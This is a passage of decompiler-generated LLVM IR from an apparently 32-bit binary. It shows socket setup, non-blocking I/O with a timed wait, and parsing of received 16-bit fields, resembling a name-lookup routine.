  %v2_804d9c931 = phi i32 [ %v1_804dbfa, %dec_label_pc_804dbf0 ], [ %v1_804d9cc, %dec_label_pc_804d9c9 ]
  %tmp103 = icmp slt i32 %v0_804d9cf, 1
  %tmp104 = icmp eq i1 %tmp103, false
  br i1 %tmp104, label %dec_label_pc_804d9b6, label %dec_label_pc_804d9d3

dec_label_pc_804d9d3:                             ; preds = %dec_label_pc_804d9cf, %dec_label_pc_804d970
  %v0_804d9d6 = phi i32 [ %v2_804d9a3, %dec_label_pc_804d970 ], [ %v2_804d9c931, %dec_label_pc_804d9cf ]
  %v1_804d9d6 = inttoptr i32 %v0_804d9d6 to i8*
  store i8 0, i8* %v1_804d9d6, align 1
  store i32 %v2_804d990, i32* %eax.global-to-local, align 4
  %v3_804d9de = call i32 @function_804fd30(i8* %tmp101)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804d9f2 = add i32 %v3_804d9de, %v2_804d990
  store i32 %v2_804d9f2, i32* @edi, align 4
  %v1_804da16 = add i32 %v2_804d9f2, 1
  store i32 %v1_804da16, i32* @ebx, align 4
  store i32 %v2_804d990, i32* %eax.global-to-local, align 4
  %v3_804da1e = call i32 @function_804fd30(i8* %tmp101)
  %v1_804da23 = add i32 %v3_804da1e, 17
  store i32 %v1_804da23, i32* %eax.global-to-local, align 4
  %v1_804da2a = call i32 @function_804d700(i32 %v1_804da23)
  %v2_804da38 = udiv i32 %v1_804da2a, 65535
  store i32 %v2_804da38, i32* %edx.global-to-local, align 4
  %v2_804da4278 = add i32 %v2_804da38, %v1_804da2a
  store i32 %v2_804da4278, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804da52 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804da52, i32* %ecx.global-to-local, align 4
  %v3_804da5a = call i32 @function_804fdc0(i32 %v2_804da52, i32 16)
  store i32 %v3_804da5a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804daa2 = load i32, i32* @edi, align 4
  %v1_804daa2 = add i32 %v0_804daa2, 1
  %v2_804daa2 = inttoptr i32 %v1_804daa2 to i16*
  store i16 256, i16* %v2_804daa2, align 2
  %v0_804daab = load i32, i32* @ebx, align 4
  %v1_804daab = add i32 %v0_804daab, 2
  %v2_804daab = inttoptr i32 %v1_804daab to i16*
  store i16 256, i16* %v2_804daab, align 2
  %v0_804dab1 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804dab1 = icmp eq i32 %v0_804dab1, -1
  br i1 %v10_804dab1, label %dec_label_pc_804dac2.preheader, label %dec_label_pc_804dab6

dec_label_pc_804dab6.loopexit:                    ; preds = %dec_label_pc_804dbd5
  %v0_804dab9.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804dab6

dec_label_pc_804dab6:                             ; preds = %dec_label_pc_804dab6.loopexit, %dec_label_pc_804d9d3
  %v0_804dab9 = phi i32 [ %v0_804dab9.pre, %dec_label_pc_804dab6.loopexit ], [ %v0_804dab1, %dec_label_pc_804d9d3 ]
  %v0_804dab6 = load i32, i32* @esp, align 4
  %v2_804dab9 = add i32 %v0_804dab6, -16
  %v3_804dab9 = inttoptr i32 %v2_804dab9 to i32*
  store i32 %v0_804dab9, i32* %v3_804dab9, align 4
  %v1_804daba = call i32 @function_8050253(i32 1)
  store i32 %v1_804daba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dac2.preheader

dec_label_pc_804dac2.preheader:                   ; preds = %dec_label_pc_804dab6, %dec_label_pc_804d9d3
  br label %dec_label_pc_804dac2

dec_label_pc_804dac2:                             ; preds = %dec_label_pc_804dac2.preheader, %dec_label_pc_804dbd5
  %v0_804dac2 = load i32, i32* @ebx, align 4
  %v1_804dac2 = load i32, i32* @esp, align 4
  %v2_804dac2 = add i32 %v1_804dac2, -4
  %v3_804dac2 = inttoptr i32 %v2_804dac2 to i32*
  store i32 %v0_804dac2, i32* %v3_804dac2, align 4
  %v1_804dac3 = add i32 %v1_804dac2, -8
  %v2_804dac3 = inttoptr i32 %v1_804dac3 to i32*
  store i32 0, i32* %v2_804dac3, align 4
  %v1_804dac5 = add i32 %v1_804dac2, -12
  %v2_804dac5 = inttoptr i32 %v1_804dac5 to i32*
  store i32 2, i32* %v2_804dac5, align 4
  %v1_804dac7 = add i32 %v1_804dac2, -16
  %v2_804dac7 = inttoptr i32 %v1_804dac7 to i32*
  store i32 2, i32* %v2_804dac7, align 4
  %v4_804dac9 = call i32 @function_8050a37(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dac9, i32* %eax.global-to-local, align 4
  %v0_804dace = load i32, i32* @esp, align 4
  store i32 %v4_804dac9, i32* @ebp, align 4
  %v10_804dad3 = icmp eq i32 %v4_804dac9, -1
  br i1 %v10_804dad3, label %dec_label_pc_804dc00, label %dec_label_pc_804dadc

dec_label_pc_804dadc:                             ; preds = %dec_label_pc_804dac2
  %v0_804dadc = load i32, i32* @ecx, align 4
  %v2_804dadc = add i32 %v0_804dace, 12
  %v3_804dadc = inttoptr i32 %v2_804dadc to i32*
  store i32 %v0_804dadc, i32* %v3_804dadc, align 4
  %v1_804dadd = add i32 %v0_804dace, 8
  %v2_804dadd = inttoptr i32 %v1_804dadd to i32*
  store i32 16, i32* %v2_804dadd, align 4
  %v1_804dadf = add i32 %v0_804dace, 4272
  store i32 %v1_804dadf, i32* @edi, align 4
  %v2_804dae6 = add i32 %v0_804dace, 4
  %v3_804dae6 = inttoptr i32 %v2_804dae6 to i32*
  store i32 %v1_804dadf, i32* %v3_804dae6, align 4
  %v3_804dae7 = inttoptr i32 %v0_804dace to i32*
  store i32 %v4_804dac9, i32* %v3_804dae7, align 4
  %v3_804dae8 = call i32 @function_805085c(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804daed = load i32, i32* @esp, align 4
  %v1_804daf0 = add i32 %v3_804dae8, 1
  %v8_804daf0 = icmp eq i32 %v1_804daf0, 0
  store i32 %v1_804daf0, i32* %eax.global-to-local, align 4
  br i1 %v8_804daf0, label %dec_label_pc_804dc00, label %dec_label_pc_804daf7

dec_label_pc_804daf7:                             ; preds = %dec_label_pc_804dadc
  %v1_804daf7 = add i32 %v0_804daed, 12
  %v2_804daf7 = inttoptr i32 %v1_804daf7 to i32*
  store i32 16384, i32* %v2_804daf7, align 4
  %v1_804dafc = add i32 %v0_804daed, 20
  %v2_804dafc = inttoptr i32 %v1_804dafc to i32*
  %v3_804dafc = load i32, i32* %v2_804dafc, align 4
  store i32 %v3_804dafc, i32* %edx.global-to-local, align 4
  %v2_804db00 = add i32 %v0_804daed, 8
  %v3_804db00 = inttoptr i32 %v2_804db00 to i32*
  store i32 %v3_804dafc, i32* %v3_804db00, align 4
  %v1_804db01 = add i32 %v0_804daed, 2096
  store i32 %v1_804db01, i32* %eax.global-to-local, align 4
  %v2_804db08 = add i32 %v0_804daed, 4
  %v3_804db08 = inttoptr i32 %v2_804db08 to i32*
  store i32 %v1_804db01, i32* %v3_804db08, align 4
  %v0_804db09 = load i32, i32* @ebp, align 4
  %v3_804db09 = inttoptr i32 %v0_804daed to i32*
  store i32 %v0_804db09, i32* %v3_804db09, align 4
  %v0_804db0a = call i32 @function_8050986()
  %v0_804db0f = load i32, i32* @esp, align 4
  %v1_804db12 = add i32 %v0_804db0a, 1
  %v8_804db12 = icmp eq i32 %v1_804db12, 0
  store i32 %v1_804db12, i32* %eax.global-to-local, align 4
  br i1 %v8_804db12, label %dec_label_pc_804dc00, label %dec_label_pc_804db19

dec_label_pc_804db19:                             ; preds = %dec_label_pc_804daf7
  %v2_804db19 = add i32 %v0_804db0f, 12
  %v3_804db19 = inttoptr i32 %v2_804db19 to i32*
  store i32 %v1_804db12, i32* %v3_804db19, align 4
  %v1_804db1a = add i32 %v0_804db0f, 8
  %v2_804db1a = inttoptr i32 %v1_804db1a to i32*
  store i32 0, i32* %v2_804db1a, align 4
  %v0_804db1c = load i32, i32* @ebp, align 4
  %v2_804db1c = add i32 %v0_804db0f, 4
  %v3_804db1c = inttoptr i32 %v2_804db1c to i32*
  store i32 %v0_804db1c, i32* %v3_804db1c, align 4
  %v2_804db1d = inttoptr i32 %v0_804db0f to i32*
  store i32 3, i32* %v2_804db1d, align 4
  %v3_804db1f = call i32 @function_80501bd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804db24 = load i32, i32* @esp, align 4
  %v12_804db27 = or i32 %v3_804db1f, 2048
  store i32 %v12_804db27, i32* %eax.global-to-local, align 4
  %v2_804db2a = add i32 %v0_804db24, 8
  %v3_804db2a = inttoptr i32 %v2_804db2a to i32*
  store i32 %v12_804db27, i32* %v3_804db2a, align 4
  %v0_804db2b = load i32, i32* @ebp, align 4
  %v2_804db2b = add i32 %v0_804db24, 4
  %v3_804db2b = inttoptr i32 %v2_804db2b to i32*
  store i32 %v0_804db2b, i32* %v3_804db2b, align 4
  %v2_804db2c = inttoptr i32 %v0_804db24 to i32*
  store i32 4, i32* %v2_804db2c, align 4
  %v3_804db2e = call i32 @function_80501bd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804db33 = load i32, i32* @esp, align 4
  %v1_804db33 = add i32 %v0_804db33, 4144
  store i32 %v1_804db33, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804db41 = inttoptr i32 %v1_804db33 to i8*
  store i32 %v1_804db33, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804db44 = call i8* @_memset(i8* %v1_804db41, i32 0, i32 32)
  %v6_804db44 = ptrtoint i8* %v5_804db44 to i32
  store i32 %v6_804db44, i32* %ecx.global-to-local, align 4
  %v0_804db46 = load i32, i32* @ebp, align 4
  %v2_804db4a = udiv i32 %v0_804db46, 32
  store i32 %v2_804db4a, i32* @esi, align 4
  %v1_804db4d = urem i32 %v0_804db46, 32
  store i32 %v1_804db4d, i32* @ebx, align 4
  %v0_804db50 = load i32, i32* @esp, align 4
  %v2_804db50 = mul nuw nsw i32 %v2_804db4a, 4
  %v3_804db50 = add nuw nsw i32 %v2_804db50, 4144
  %v4_804db50 = add i32 %v3_804db50, %v0_804db50
  %v5_804db50 = inttoptr i32 %v4_804db50 to i32*
  %v6_804db50 = load i32, i32* %v5_804db50, align 4
  %v9_804db50 = shl i32 1, %v1_804db4d
  %v12_804db50 = or i32 %v6_804db50, %v9_804db50
  store i32 %v12_804db50, i32* %v5_804db50, align 4
  %v0_804db58 = load i32, i32* @esp, align 4
  %v1_804db58 = add i32 %v0_804db58, 4288
  %v2_804db58 = inttoptr i32 %v1_804db58 to i32*
  store i32 5, i32* %v2_804db58, align 4
  %v0_804db63 = load i32, i32* @esp, align 4
  %v1_804db63 = add i32 %v0_804db63, 4292
  %v2_804db63 = inttoptr i32 %v1_804db63 to i32*
  store i32 0, i32* %v2_804db63, align 4
  %v0_804db6e = load i32, i32* @esp, align 4
  %v1_804db6e = inttoptr i32 %v0_804db6e to i32*
  %v1_804db6f = add i32 %v0_804db6e, 4288
  store i32 %v1_804db6f, i32* %v1_804db6e, align 4
  %v0_804db77 = load i32, i32* @ebp, align 4
  %v1_804db77 = add i32 %v0_804db77, 1
  store i32 %v1_804db77, i32* %eax.global-to-local, align 4
  %v1_804db7a = add i32 %v0_804db6e, -4
  %v2_804db7a = inttoptr i32 %v1_804db7a to i32*
  store i32 0, i32* %v2_804db7a, align 4
  %v1_804db7c = add i32 %v0_804db6e, -8
  %v2_804db7c = inttoptr i32 %v1_804db7c to i32*
  store i32 0, i32* %v2_804db7c, align 4
  %v0_804db7e = load i32, i32* %edx.global-to-local, align 4
  %v2_804db7e = add i32 %v0_804db6e, -12
  %v3_804db7e = inttoptr i32 %v2_804db7e to i32*
  store i32 %v0_804db7e, i32* %v3_804db7e, align 4
  %v0_804db7f = load i32, i32* %eax.global-to-local, align 4
  %v2_804db7f = add i32 %v0_804db6e, -16
  %v3_804db7f = inttoptr i32 %v2_804db7f to i32*
  store i32 %v0_804db7f, i32* %v3_804db7f, align 4
  %v0_804db80 = call i32 @function_805045a()
  %v0_804db85 = load i32, i32* @esp, align 4
  %v1_804db85 = add i32 %v0_804db85, 32
  %v1_804db88 = add i32 %v0_804db80, 1
  %v8_804db88 = icmp eq i32 %v1_804db88, 0
  store i32 %v1_804db88, i32* %eax.global-to-local, align 4
  br i1 %v8_804db88, label %dec_label_pc_804dbce, label %dec_label_pc_804db8b

dec_label_pc_804db8b:                             ; preds = %dec_label_pc_804db19
  %v1_804db8b = load i32, i32* @esi, align 4
  %v2_804db8b = mul i32 %v1_804db8b, 4
  %v3_804db8b = add i32 %v0_804db85, 4160
  %v4_804db8b = add i32 %v3_804db8b, %v2_804db8b
  %v5_804db8b = inttoptr i32 %v4_804db8b to i32*
  %v6_804db8b = load i32, i32* %v5_804db8b, align 4
  %v7_804db8b = load i32, i32* @ebx, align 4
  %v8_804db8b = urem i32 %v7_804db8b, 32
  %v9_804db8b = shl i32 1, %v8_804db8b
  %v10_804db8b = and i32 %v9_804db8b, %v6_804db8b
  %v11_804db8b = icmp ne i32 %v10_804db8b, 0
  %v1_804db93 = zext i1 %v11_804db8b to i32
  %v3_804db93 = and i32 %v1_804db88, -256
  %v4_804db93 = or i32 %v1_804db93, %v3_804db93
  store i32 %v4_804db93, i32* %eax.global-to-local, align 4
  %v4_804db96 = icmp eq i1 %v11_804db8b, false
  br i1 %v4_804db96, label %dec_label_pc_804dc14, label %dec_label_pc_804db9a

dec_label_pc_804db9a:                             ; preds = %dec_label_pc_804db8b
  %v2_804db9a = add i32 %v0_804db85, 28
  %v3_804db9a = inttoptr i32 %v2_804db9a to i32*
  store i32 %v4_804db93, i32* %v3_804db9a, align 4
  %v0_804db9b = load i32, i32* %eax.global-to-local, align 4
  %v2_804db9b = add i32 %v0_804db85, 24
  %v3_804db9b = inttoptr i32 %v2_804db9b to i32*
  store i32 %v0_804db9b, i32* %v3_804db9b, align 4
  %v1_804db9c = add i32 %v0_804db85, 20
  %v2_804db9c = inttoptr i32 %v1_804db9c to i32*
  store i32 0, i32* %v2_804db9c, align 4
  %v1_804db9e = add i32 %v0_804db85, 16
  %v2_804db9e = inttoptr i32 %v1_804db9e to i32*
  store i32 0, i32* %v2_804db9e, align 4
  %v1_804dba0 = add i32 %v0_804db85, 12
  %v2_804dba0 = inttoptr i32 %v1_804dba0 to i32*
  store i32 16384, i32* %v2_804dba0, align 4
  %v1_804dba5 = add i32 %v0_804db85, 8
  %v2_804dba5 = inttoptr i32 %v1_804dba5 to i32*
  store i32 2048, i32* %v2_804dba5, align 4
  %v1_804dbaa = add i32 %v0_804db85, 64
  store i32 %v1_804dbaa, i32* %eax.global-to-local, align 4
  %v2_804dbae = add i32 %v0_804db85, 4
  %v3_804dbae = inttoptr i32 %v2_804dbae to i32*
  store i32 %v1_804dbaa, i32* %v3_804dbae, align 4
  %v0_804dbaf = load i32, i32* @ebp, align 4
  %v3_804dbaf = inttoptr i32 %v0_804db85 to i32*
  store i32 %v0_804dbaf, i32* %v3_804dbaf, align 4
  %v0_804dbb0 = call i32 @function_8050943()
  store i32 %v0_804dbb0, i32* %eax.global-to-local, align 4
  %v0_804dbb5 = load i32, i32* @esp, align 4
  store i32 %v0_804dbb0, i32* @ebx, align 4
  %v1_804dbba = add i32 %v0_804dbb5, 56
  %v2_804dbba = inttoptr i32 %v1_804dbba to i32*
  %v3_804dbba = load i32, i32* %v2_804dbba, align 4
  store i32 %v3_804dbba, i32* %eax.global-to-local, align 4
  %v2_804dbbe = add i32 %v0_804dbb5, 16
  %v3_804dbbe = inttoptr i32 %v2_804dbbe to i32*
  store i32 %v3_804dbba, i32* %v3_804dbbe, align 4
  %v2_804dbbf = call i32 @function_804fd30(i8* inttoptr (i32 1 to i8*))
  %v1_804dbc4 = add i32 %v2_804dbbf, 17
  store i32 %v1_804dbc4, i32* %eax.global-to-local, align 4
  %v0_804dbc7 = load i32, i32* @esp, align 4
  %v1_804dbc7 = add i32 %v0_804dbc7, 16
  %v0_804dbca = load i32, i32* @ebx, align 4
  %v7_804dbca = icmp ult i32 %v0_804dbca, %v1_804dbc4
  %v1_804dbcc = icmp eq i1 %v7_804dbca, false
  br i1 %v1_804dbcc, label %dec_label_pc_804dc3a, label %dec_label_pc_804dbce

dec_label_pc_804dbce:                             ; preds = %dec_label_pc_804dc66, %dec_label_pc_804dc3a, %dec_label_pc_804db9a, %dec_label_pc_804db19
  %v0_804dbce = phi i32 [ %v1_804dc53, %dec_label_pc_804dc66 ], [ %v1_804dc53, %dec_label_pc_804dc3a ], [ %v1_804dbc7, %dec_label_pc_804db9a ], [ %v1_804db85, %dec_label_pc_804db19 ]
  %v1_804dbce = add i32 %v0_804dbce, 8
  %v2_804dbce = inttoptr i32 %v1_804dbce to i32*
  %v3_804dbce = load i32, i32* %v2_804dbce, align 4
  %v12_804dbce = icmp eq i32 %v3_804dbce, 5
  br i1 %v12_804dbce, label %dec_label_pc_804dc14, label %dec_label_pc_804dbd5

dec_label_pc_804dbd5:                             ; preds = %dec_label_pc_804dc00, %dec_label_pc_804dbce
  %v3_804dbd5 = phi i32 [ %v3_804dc0d, %dec_label_pc_804dc00 ], [ %v3_804dbce, %dec_label_pc_804dbce ]
  %v1_804dbdd = phi i32 [ %v1_804dc0a, %dec_label_pc_804dc00 ], [ %v0_804dbce, %dec_label_pc_804dbce ]
  %v1_804dbd5 = add i32 %v1_804dbdd, 8
  %v2_804dbd5 = inttoptr i32 %v1_804dbd5 to i32*
  %v1_804dbd9 = add i32 %v3_804dbd5, 1
  store i32 %v1_804dbd9, i32* @edi, align 4
  %v0_804dbda = load i32, i32* @ebp, align 4
  %v10_804dbda = icmp eq i32 %v0_804dbda, -1
  store i32 %v1_804dbd9, i32* %v2_804dbd5, align 4
  %v1_804dbe1 = icmp eq i1 %v10_804dbda, false
  br i1 %v1_804dbe1, label %dec_label_pc_804dab6.loopexit, label %dec_label_pc_804dac2

dec_label_pc_804dbf0:                             ; preds = %dec_label_pc_804d9b6, %dec_label_pc_804d9b6
  %v0_804dbf0 = load i32, i32* @esi, align 4
  store i32 %v0_804dbf0, i32* @edx, align 4
  %v1_804dbf2 = add i32 %v0_804d9b6, 1
  store i32 %v1_804dbf2, i32* @ebx, align 4
  %v1_804dbf3 = trunc i32 %v0_804dbf0 to i8
  %v2_804dbf3 = load i32, i32* %edi.global-to-local, align 4
  %v3_804dbf3 = inttoptr i32 %v2_804dbf3 to i8*
  store i8 %v1_804dbf3, i8* %v3_804dbf3, align 1
  store i32 0, i32* @esi, align 4
  %v0_804dbf7 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804dbf7, i32* %edi.global-to-local, align 4
  %v0_804dbf9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dbf9 = add i32 %v0_804dbf9, -1
  store i32 %v1_804dbf9, i32* %eax.global-to-local, align 4
  %v1_804dbfa = add i32 %v0_804dbf7, 1
  store i32 %v1_804dbfa, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d9cf

dec_label_pc_804dc00:                             ; preds = %dec_label_pc_804daf7, %dec_label_pc_804dadc, %dec_label_pc_804dac2
  %v0_804dc00.in = phi i32 [ %v0_804db0f, %dec_label_pc_804daf7 ], [ %v0_804daed, %dec_label_pc_804dadc ], [ %v0_804dace, %dec_label_pc_804dac2 ]
  %v2_804dc03 = inttoptr i32 %v0_804dc00.in to i32*
  store i32 1, i32* %v2_804dc03, align 4
  %v0_804dc05 = call i32 @function_8051dda()
  store i32 %v0_804dc05, i32* %eax.global-to-local, align 4
  %v0_804dc0a = load i32, i32* @esp, align 4
  %v1_804dc0a = add i32 %v0_804dc0a, 16
  %v1_804dc0d = add i32 %v0_804dc0a, 24
  %v2_804dc0d = inttoptr i32 %v1_804dc0d to i32*
  %v3_804dc0d = load i32, i32* %v2_804dc0d, align 4
  %v12_804dc0d = icmp eq i32 %v3_804dc0d, 5
  %v1_804dc12 = icmp eq i1 %v12_804dc0d, false
  br i1 %v1_804dc12, label %dec_label_pc_804dbd5, label %dec_label_pc_804dc14

dec_label_pc_804dc14:                             ; preds = %dec_label_pc_804dc00, %dec_label_pc_804dbce, %dec_label_pc_804db8b, %dec_label_pc_804dc74, %dec_label_pc_804dc7d.backedge
  %v0_804dc14 = phi i32 [ %v0_804dc82122, %dec_label_pc_804dc74 ], [ %v0_804dc82, %dec_label_pc_804dc7d.backedge ], [ %v1_804dc0a, %dec_label_pc_804dc00 ], [ %v0_804dbce, %dec_label_pc_804dbce ], [ %v1_804db85, %dec_label_pc_804db8b ]
  %v0_804dc17 = load i32, i32* @ebp, align 4
  %v2_804dc17 = add i32 %v0_804dc14, -16
  %v3_804dc17 = inttoptr i32 %v2_804dc17 to i32*
  store i32 %v0_804dc17, i32* %v3_804dc17, align 4
  %v1_804dc18 = call i32 @function_8050253(i32 1)
  store i32 %v1_804dc18, i32* %eax.global-to-local, align 4
  %v0_804dc1d = load i32, i32* @esp, align 4
  %v1_804dc1d = add i32 %v0_804dc1d, 16
  %v1_804dc20 = inttoptr i32 %v1_804dc1d to i32*
  %v2_804dc20 = load i32, i32* %v1_804dc20, align 4
  store i32 %v2_804dc20, i32* @edx, align 4
  %v1_804dc23 = inttoptr i32 %v2_804dc20 to i8*
  %v2_804dc23 = load i8, i8* %v1_804dc23, align 1
  %v3_804dc23 = icmp eq i8 %v2_804dc23, 0
  br i1 %v3_804dc23, label %dec_label_pc_804dd23, label %dec_label_pc_804dc2c

dec_label_pc_804dc2c:                             ; preds = %dec_label_pc_804dc14
  %v2_804dc2c = load i32, i32* %v1_804dc20, align 4
  store i32 %v2_804dc2c, i32* %eax.global-to-local, align 4
  %v1_804dc2f = add i32 %v0_804dc1d, 4300
  %v1_804dc35 = inttoptr i32 %v1_804dc2f to i32*
  %v2_804dc35 = load i32, i32* %v1_804dc35, align 4
  store i32 %v2_804dc35, i32* @ebx, align 4
  %v3_804dc36 = add i32 %v0_804dc1d, 4308
  %v1_804dc37 = inttoptr i32 %v3_804dc36 to i32*
  %v2_804dc37 = load i32, i32* %v1_804dc37, align 4
  store i32 %v2_804dc37, i32* @edi, align 4
  %v3_804dc37 = add i32 %v0_804dc1d, 4312
  %v1_804dc38 = inttoptr i32 %v3_804dc37 to i32*
  %v2_804dc38 = load i32, i32* %v1_804dc38, align 4
  store i32 %v2_804dc38, i32* @ebp, align 4
  ret i32 %v2_804dc2c

dec_label_pc_804dc3a:                             ; preds = %dec_label_pc_804db9a
  %v1_804dc3a = add i32 %v0_804dbc7, 60
  store i32 %v1_804dc3a, i32* %edx.global-to-local, align 4
  %v2_804dc3e = add i32 %v0_804dbc7, 40
  %v3_804dc3e = inttoptr i32 %v2_804dc3e to i32*
  store i32 %v1_804dc3a, i32* %v3_804dc3e, align 4
  %v0_804dc42 = load i32, i32* @esp, align 4
  %v1_804dc45 = add i32 %v0_804dc42, 44
  store i32 %v1_804dc45, i32* %ecx.global-to-local, align 4
  %v2_804dc49 = add i32 %v0_804dc42, -16
  %v3_804dc49 = inttoptr i32 %v2_804dc49 to i32*
  store i32 %v1_804dc45, i32* %v3_804dc49, align 4
  %v2_804dc4a = call i32 @function_804fd30(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804dc4a, i32* %eax.global-to-local, align 4
  %v0_804dc4f = load i32, i32* @esp, align 4
  %v2_804dc4f = add i32 %v2_804dc4a, 65
  %v3_804dc4f = add i32 %v2_804dc4f, %v0_804dc4f
  store i32 %v3_804dc4f, i32* %ecx.global-to-local, align 4
  %v1_804dc53 = add i32 %v0_804dc4f, 16
  %v1_804dc56 = add i32 %v0_804dc4f, 30
  %v2_804dc56 = inttoptr i32 %v1_804dc56 to i16*
  %v3_804dc56 = load i16, i16* %v2_804dc56, align 2
  %v4_804dc56 = zext i16 %v3_804dc56 to i32
  %v7_804dc56 = and i32 %v1_804db33, -65536
  %v8_804dc56 = or i32 %v4_804dc56, %v7_804dc56
  store i32 %v8_804dc56, i32* @edi, align 4
  %v3_804dc5b = add i32 %v0_804dc4f, 48
  %v4_804dc5b = inttoptr i32 %v3_804dc5b to i16*
  %v5_804dc5b = load i16, i16* %v4_804dc5b, align 2
  %v16_804dc5b = icmp eq i16 %v3_804dc56, %v5_804dc5b
  %v1_804dc60 = icmp eq i1 %v16_804dc5b, false
  br i1 %v1_804dc60, label %dec_label_pc_804dbce, label %dec_label_pc_804dc66

dec_label_pc_804dc66:                             ; preds = %dec_label_pc_804dc3a
  %v1_804dc66 = add i32 %v0_804dc4f, 54
  %v2_804dc66 = inttoptr i32 %v1_804dc66 to i16*
  %v3_804dc66 = load i16, i16* %v2_804dc66, align 2
  %v4_804dc66 = zext i16 %v3_804dc66 to i32
  %v6_804dc66 = and i32 %v2_804dc4a, -65536
  %v7_804dc66 = or i32 %v4_804dc66, %v6_804dc66
  store i32 %v7_804dc66, i32* %eax.global-to-local, align 4
  %v4_804dc6b = icmp eq i16 %v3_804dc66, 0
  br i1 %v4_804dc6b, label %dec_label_pc_804dbce, label %dec_label_pc_804dc74

dec_label_pc_804dc74:                             ; preds = %dec_label_pc_804dc66
  %v2_804dc74 = call i16 @llvm.bswap.i16(i16 %v3_804dc66)
  %v3_804dc74 = zext i16 %v2_804dc74 to i32
  %v6_804dc74 = or i32 %v3_804dc74, %v6_804dc66
  store i32 %v6_804dc74, i32* %eax.global-to-local, align 4
  %v3_804dc78 = add i32 %v0_804dc4f, 38
  %v4_804dc78 = inttoptr i32 %v3_804dc78 to i16*
  store i16 %v2_804dc74, i16* %v4_804dc78, align 2
  %v0_804dc7d117 = load i32, i32* @esp, align 4
  %v1_804dc7d118 = add i32 %v0_804dc7d117, 22
  %v2_804dc7d119 = inttoptr i32 %v1_804dc7d118 to i16*
  %v3_804dc7d120 = load i16, i16* %v2_804dc7d119, align 2
  %v4_804dc7d121 = add i16 %v3_804dc7d120, -1
  store i16 %v4_804dc7d121, i16* %v2_804dc7d119, align 2
  %v0_804dc82122 = load i32, i32* @esp, align 4
  %v1_804dc82123 = add i32 %v0_804dc82122, 22
  %v2_804dc82124 = inttoptr i32 %v1_804dc82123 to i16*
  %v3_804dc82125 = load i16, i16* %v2_804dc82124, align 2
  %v13_804dc82126 = icmp eq i16 %v3_804dc82125, -1
  br i1 %v13_804dc82126, label %dec_label_pc_804dc14, label %dec_label_pc_804dc8a

dec_label_pc_804dc8a:                             ; preds = %dec_label_pc_804dc74, %dec_label_pc_804dc7d.backedge
  %v0_804dc82127 = phi i32 [ %v0_804dc82, %dec_label_pc_804dc7d.backedge ], [ %v0_804dc82122, %dec_label_pc_804dc74 ]
  %v0_804dc8a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804dc8a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804dc9313 = inttoptr i32 %v0_804dc8a to i8*
  %v2_804dc9314 = load i8, i8* %v1_804dc9313, align 1
  %v3_804dc9315 = zext i8 %v2_804dc9314 to i32
  %v4_804dc9316 = load i32, i32* %eax.global-to-local, align 4
  %v5_804dc9317 = and i32 %v4_804dc9316, -256
  %v6_804dc9318 = or i32 %v5_804dc9317, %v3_804dc9315
  store i32 %v6_804dc9318, i32* %eax.global-to-local, align 4
  %v4_804dc9519 = icmp eq i8 %v2_804dc9314, 0
  br i1 %v4_804dc9519, label %dec_label_pc_804dcca, label %dec_label_pc_804dc99.preheader.preheader

dec_label_pc_804dc99.preheader.preheader:         ; preds = %dec_label_pc_804dc8a
  %v1_804dcbe = add i32 %v0_804dc82127, 32
  br label %dec_label_pc_804dc99.preheader

dec_label_pc_804dc99.preheader:                   ; preds = %dec_label_pc_804dc99.preheader.preheader, %dec_label_pc_804dd5c
  %v0_804dd60 = phi i32 [ %v3_804dd60, %dec_label_pc_804dd5c ], [ 1, %dec_label_pc_804dc99.preheader.preheader ]
  %v0_804dd5d42 = phi i32 [ %v0_804dd5d, %dec_label_pc_804dd5c ], [ 0, %dec_label_pc_804dc99.preheader.preheader ]
  %v0_804dca638 = phi i32 [ %v1_804dd5c, %dec_label_pc_804dd5c ], [ %v0_804dc8a, %dec_label_pc_804dc99.preheader.preheader ]
  %v0_804dc9936 = phi i32 [ %v6_804dc93, %dec_label_pc_804dd5c ], [ %v6_804dc9318, %dec_label_pc_804dc99.preheader.preheader ]
  br label %dec_label_pc_804dc99

dec_label_pc_804dc99:                             ; preds = %dec_label_pc_804dc99.preheader, %dec_label_pc_804dca1
  %v0_804dd5d = phi i32 [ %v0_804dd5d42, %dec_label_pc_804dc99.preheader ], [ 1, %dec_label_pc_804dca1 ]
  %v0_804dd5c = phi i32 [ %v0_804dca638, %dec_label_pc_804dc99.preheader ], [ %v2_804dcc2, %dec_label_pc_804dca1 ]
  %v4_804dc93 = phi i32 [ %v0_804dc9936, %dec_label_pc_804dc99.preheader ], [ %v6_804dcc4, %dec_label_pc_804dca1 ]
  %v1_804dc99 = trunc i32 %v4_804dc93 to i8
  %tmp139 = icmp ult i8 %v1_804dc99, -64
  br i1 %tmp139, label %dec_label_pc_804dd5c, label %dec_label_pc_804dca1

dec_label_pc_804dca1:                             ; preds = %dec_label_pc_804dc99
  %v1_804dca1 = urem i32 %v4_804dc93, 256
  store i32 %v1_804dca1, i32* %eax.global-to-local, align 4
  %v1_804dca6 = add i32 %v0_804dd5c, 1
  %v2_804dca6 = inttoptr i32 %v1_804dca6 to i8*
  %v3_804dca6 = load i8, i8* %v2_804dca6, align 1
